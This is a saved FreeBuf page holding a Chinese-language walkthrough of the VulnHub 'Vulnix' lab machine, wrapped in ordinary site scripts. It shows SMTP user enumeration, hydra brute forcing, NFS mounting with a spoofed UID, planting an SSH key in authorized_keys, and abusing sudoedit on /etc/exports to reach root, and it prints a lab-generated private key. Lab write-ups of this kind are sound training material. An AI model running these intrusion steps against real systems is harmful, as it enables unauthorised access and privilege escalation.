@@ -1,0 +1,458 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <h2>下载地址</h2>
+<pre>https://download.vulnhub.com/hacklab/Vulnix.7z<br /></pre>
+<h2>实战演练</h2>
+<p>使用netdiscover找到IP</p>
+<p><img alt="image.png" data-original="images/20190715/1563158552_5d2be81858bbe.png" src="images/20190715/1563158552_5d2be81858bbe.png" width="972" height="346" />使用nmap查找开放的端口</p>
+<noscript><img alt="image.png" src="images/20190715/1563158552_5d2be81858bbe.png" width="972" height="346" />使用nmap查找开放的端口</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563159292_5d2beafca3063.png" src="images/20190715/1563159292_5d2beafca3063.png" width="964" height="571" />靶机开放25端口，试试枚举一下smtp账号</p>
+<noscript><img alt="image.png" src="images/20190715/1563159292_5d2beafca3063.png" width="964" height="571" />靶机开放25端口，试试枚举一下smtp账号</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563159681_5d2bec817e45c.png" src="images/20190715/1563159681_5d2bec817e45c.png" width="1200" height="861" />使用hydra爆破user账号</p>
+<noscript><img alt="image.png" src="images/20190715/1563159681_5d2bec817e45c.png" width="1200" height="861" />使用hydra爆破user账号</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563162439_5d2bf74714e03.png" src="images/20190715/1563162439_5d2bf74714e03.png" width="1200" height="233" />使用user账号登录靶机，su提权，失败。</p>
+<noscript><img alt="image.png" src="images/20190715/1563162439_5d2bf74714e03.png" width="1200" height="233" />使用user账号登录靶机，su提权，失败。</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563162978_5d2bf9623356c.png" src="images/20190715/1563162978_5d2bf9623356c.png" width="862" height="575" /></p>
+<noscript><img alt="image.png" src="images/20190715/1563162978_5d2bf9623356c.png" width="862" height="575" /></p></noscript>
+<p>靶机开放了2049端口(nfs<span style="background-color:transparent;">)</span></p>
+<pre>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。
+</pre>
+<p><span style="color:rgb(51,51,51);">showmount命令用于查询NFS服务器的相关信息。<b>kali没有自带showmount，需要自己安装。apt install nfs-common</b></span></p>
+<pre># showmount --help
+　　Usage： showmount ［-adehv］
+　　［--all］ ［--directories］ ［--exports］
+　　［--no-headers］ ［--help］ ［--version］ ［host］
+　　-a或--all
+　　以 host:dir 这样的格式来显示客户主机名和挂载点目录。
+　　-d或--directories
+　　仅显示被客户挂载的目录名。
+　　-e或--exports
+　　显示NFS服务器的输出清单。
+　　-h或--help
+　　显示帮助信息。
+　　-v或--version
+　　显示版本信。
+　　--no-headers
+　　禁止输出描述头部信息。
+　　显示NFS客户端信息
+　　# showmount
+　　显示指定NFS服务器连接NFS客户端的信息
+　　# showmount 192.168.1.1 #此ip为nfs服务器的
+　　显示输出目录列表
+　　# showmount -e
+　　显示指定NFS服务器输出目录列表（也称为共享目录列表）
+　　# showmount -e 192.168.1.1
+　　显示被挂载的共享目录
+　　# showmount -d
+　　显示客户端信息和共享目录
+　　# showmount -a
+　　显示指定NFS服务器的客户端信息和共享目录
+　　# showmount -a 192.168.1.1</pre>
+<p>输出清单</p>
+<pre>kali:~# showmount -e 192.168.0.104
+Export list for 192.168.0.104:
+/home/vulnix *
+root@kali:~#</pre>
+<p>挂载NFS，进入之后提示，权限不够</p>
+<pre>root@kali:~# mkdir /tmp/mount
+root@kali:~# mount -t nfs  192.168.0.104:/home/vulnix /tmp/mount/
+root@kali:~# cd /tmp/mount/
+bash: cd: /tmp/mount/: Permission denied
+<br /></pre>
+<p>之前ssh连接上的user账号，查看passwd，vulnix账号的UID为2008</p>
+<p><img alt="image.png" data-original="images/20190715/1563165416_5d2c02e8c92c9.png" src="images/20190715/1563165416_5d2c02e8c92c9.png" width="692" height="620" />创建一个相同的UID账号，就可以登录进去</p>
+<noscript><img alt="image.png" src="images/20190715/1563165416_5d2c02e8c92c9.png" width="692" height="620" />创建一个相同的UID账号，就可以登录进去</p></noscript>
+<pre>root@kali:/tmp# useradd -u 2008 vulnix
+root@kali:/tmp# su vulnix
+$ /bin/bash
+vulnix@kali:/tmp$ cd mount
+vulnix@kali:/tmp/mount$ ls -al
+total 24
+drwxr-x---  3 nobody 4294967294 4096 Jul 15 00:57 .
+drwxrwxrwt 21 root   root       4096 Jul 15 01:03 ..
+-rw-r--r--  1 nobody 4294967294  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 nobody 4294967294 3486 Apr  3  2012 .bashrc
+-rw-r--r--  1 nobody 4294967294  675 Apr  3  2012 .profile
+</pre>
+<p>创建SSH证书</p>
+<pre>vulnix@kali:/tmp/mount$ mkdir .ssh
+vulnix@kali:/tmp/mount$ cd .ssh
+vulnix@kali:/tmp/mount/.ssh$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): ./id_rsa
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in ./id_rsa.
+Your public key has been saved in ./id_rsa.pub.
+The key fingerprint is:
+SHA256:1BbCHz69p0pTY7LPWUi6nAxa0Jg9fx/RAANPfJL6ZQI vulnix@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|       .. oo+.   |
+|        .oE++o.  |
+|        .oo=.o.  |
+|       * .= o oo |
+|      + S .o==. .|
+|       . o Boo.. |
+|        o * ooo  |
+|       o = B.+ . |
+|      .   *.+ .  |
++----[SHA256]-----+
+vulnix@kali:/tmp/mount/.ssh$ ls -al
+total 16
+drwxr-xr-x 2 nobody 4294967294 4096 Jul 15 01:07 .
+drwxr-x--- 3 nobody 4294967294 4096 Jul 15 01:06 ..
+-rw------- 1 nobody 4294967294 1823 Jul 15 01:07 id_rsa
+-rw-r--r-- 1 nobody 4294967294  393 Jul 15 01:07 id_rsa.pub
+
+</pre>
+<p>复制私钥</p>
+<pre>vulnix@kali:/tmp/mount/.ssh$ mv id_rsa.pub authorized_keys
+vulnix@kali:/tmp/mount/.ssh$ cat id_rsa 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA3HaRqr2UAtlR3vE9x1RHN8bUdldnu9CtGy9Pkw6P5f7BSeDGCXjk
+1oJfdcSvzAH7g6Llbrtwi9HiNQtJz+0z8c9eIeFpBsFtzuMRcVubzlfYlYhAv41TqZPUkm
+PKNXmaIIoPgRRN4ID2wMc1BLk5Q7SOAHv+Ef0yVg/6EI8u2SB8l0Iqd/1naHXBwXZsh4bk
+OkmPdnCdYaX5FtF7wrcCyMjC577b0K935a0I9uhJ8eyJovktxZKiZrZh6h579QFE3zGXm+
+p9st2uooI2C4sPBNlGEeqTbTzQNb8iS7KVxDn1UfG1ljSOlYNs7txSpt7fHvAloPt9iWar
+GDaEVuTODQAAA8jjNfe/4zX3vwAAAAdzc2gtcnNhAAABAQDcdpGqvZQC2VHe8T3HVEc3xt
+R2V2e70K0bL0+TDo/l/sFJ4MYJeOTWgl91xK/MAfuDouVuu3CL0eI1C0nP7TPxz14h4WkG
+wW3O4xFxW5vOV9iViEC/jVOpk9SSY8o1eZogig+BFE3ggPbAxzUEuTlDtI4Ae/4R/TJWD/
+oQjy7ZIHyXQip3/WdodcHBdmyHhuQ6SY92cJ1hpfkW0XvCtwLIyMLnvtvQr3flrQj26Enx
+7Imi+S3FkqJmtmHqHnv1AUTfMZeb6n2y3a6igjYLiw8E2UYR6pNtPNA1vyJLspXEOfVR8b
+WWNI6Vg2zu3FKm3t8e8CWg+32JZqsYNoRW5M4NAAAAAwEAAQAAAQBGg94/wHdxGdWn+32J
+HhnRa1VVrMtPNYXI5i8LmGLKa9ujJ7PwH60CN50U7B5WoGO0TQwZiPaMoks6MCwhx3sP4w
+X2zERtlrzqqZJQsb56F3r9CSG8oxWZbeFWGXj59bUop0AiRz5JirZiHtWEd0Irt7qbyQ0Q
+7+2DvYR8e2++np8btSNyJJIc5wvvlh0h7KYr5RYVEdAylbEdCLzJaRtt8tWTbr+waUg2A4
+fNlWRBZTPuFvwRD2JQG6U5KOmRbXEZVfIO0gEjxjjoG8IKIHb/UYT7AQopARi3NfuWWHYV
+jbUsl4aiIBWa8H6X1BBpVROKpslPxkOa/4FmikJ+D3RBAAAAgQC1DDJj0xuNtHvFVmOvy7
+V/ISjVFIlWe1Vo/2eOrt9vyXf9FsBUfgGzG6HHnNERXVpUtrgJtYHYV68tBh0BKFhgg1X/
+Z5g0z0rIMKtwjFwRsv8NHz6Rs8DyDeiGEfNcVHcE05oKSVjWs7oZMG4LYLUFzldwM96MKC
+6RHR79f+rMHAAAAIEA/2iohngAKm+6j8IgHAku83wrSQ4VdVunwwegiY2olFLAzNgNTfVY
+Ib40yMR8bjC2YdVfIVrUIk4ItWRQ1hihBNeQgSdni76mCY/4CvpUShab2XysAMYWQBuORj
++Kw1+DpaYR1ftIG1XfqeU6jVFTEgUdK/WogZzUIcvEgM1kkskAAACBANz5NCoaUb7+PLYt
+uEyiRoxsAo2B4bLy5NZNy2/4dXiPZ9XwYGZrohHk/NUtQMZAQNyn1EzymoFfagZANuMQ7T
+ODvr9L/UqL9EWdabrVyAlMnMa61aDRqNNdjAElMNRY5JaGbBVSAXvI7qezsjr/WyK237OD
+aywsPDaFbvK0S18lAAAAC3Z1bG5peEBrYWxpAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+<br /></pre>
+<p>使用私钥进行登录，如果提示安全问题，需要修改私钥的权限</p>
+<p><img alt="image.png" data-original="images/20190715/1563167674_5d2c0bbae2935.png" src="images/20190715/1563167674_5d2c0bbae2935.png" width="929" height="656" />查看账号权限</p>
+<noscript><img alt="image.png" src="images/20190715/1563167674_5d2c0bbae2935.png" width="929" height="656" />查看账号权限</p></noscript>
+<pre>vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+</pre>
+<p><span>sudoedit /etc/exports，添加这一行，nfs开放root目录</span></p>
+<p><span><img alt="image.png" data-original="images/20190715/1563168383_5d2c0e7f7ea09.png" src="images/20190715/1563168383_5d2c0e7f7ea09.png" width="932" height="323" />再物理重启靶机VM，让NFS读取这个配置文件</span></p>
+<noscript><img alt="image.png" src="images/20190715/1563168383_5d2c0e7f7ea09.png" width="932" height="323" />再物理重启靶机VM，让NFS读取这个配置文件</span></p></noscript>
+<p>之后就可以看到root目录共享出来</p>
+<p><img alt="image.png" data-original="images/20190715/1563188667_5d2c5dbb1a4b3.png" src="images/20190715/1563188667_5d2c5dbb1a4b3.png" width="459" height="97" />挂载上去</p>
+<noscript><img alt="image.png" src="images/20190715/1563188667_5d2c5dbb1a4b3.png" width="459" height="97" />挂载上去</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563188909_5d2c5ead9e7ab.png" src="images/20190715/1563188909_5d2c5ead9e7ab.png" width="857" height="389" />接着就像上面一样，生成私钥，用私钥连接</p>
+<noscript><img alt="image.png" src="images/20190715/1563188909_5d2c5ead9e7ab.png" width="857" height="389" />接着就像上面一样，生成私钥，用私钥连接</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563189241_5d2c5ff95d0ec.png" src="images/20190715/1563189241_5d2c5ff95d0ec.png" width="920" height="977" />登陆成功</p>
+<noscript><img alt="image.png" src="images/20190715/1563189241_5d2c5ff95d0ec.png" width="920" height="977" />登陆成功</p></noscript>
+<p><img alt="image.png" data-original="images/20190715/1563189350_5d2c60663057c.png" src="images/20190715/1563189350_5d2c60663057c.png" width="825" height="642" /></p>
+<noscript><img alt="image.png" src="images/20190715/1563189350_5d2c60663057c.png" width="825" height="642" /></p></noscript>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num"></p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="201667" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
+                                                    </div>
+                        <div class="wechatcodeDiv">
